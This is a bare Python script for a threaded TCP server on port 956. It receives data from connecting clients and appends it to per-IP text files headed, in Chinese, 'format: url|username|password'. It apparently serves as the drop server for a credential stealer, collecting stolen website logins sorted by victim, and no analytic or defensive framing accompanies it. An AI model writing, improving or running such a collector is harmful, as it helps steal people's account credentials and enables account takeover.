import socket
import threading

def save_data(data,addr):
    ipp = "%s:%s" % addr
    ip = ipp.split(":")[0] + ".txt"
    
    data = data.split("----")
    print(data)
    with open(ip,"a") as p:
        p.write("格式:url|用戶名|密碼\n")
        for i in data:
            p.write(i+"\n")


def handler(clientsocket,ip):
    while 1:
        clientsocket.send(b"len:\r\n")
        lens = clientsocket.recv(1024).decode().strip()
        if not lens:
            continue
        break
    
        
    data = clientsocket.recv(99999).decode().strip()
    save_data(data,addr)
    clientsocket.close()
    
        
    
        



s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0",956))    
s.listen(99)
while 1:
    clientsocket,addr = s.accept()      
    
    t = threading.Thread(target=handler, args=(clientsocket, addr))
    t.start()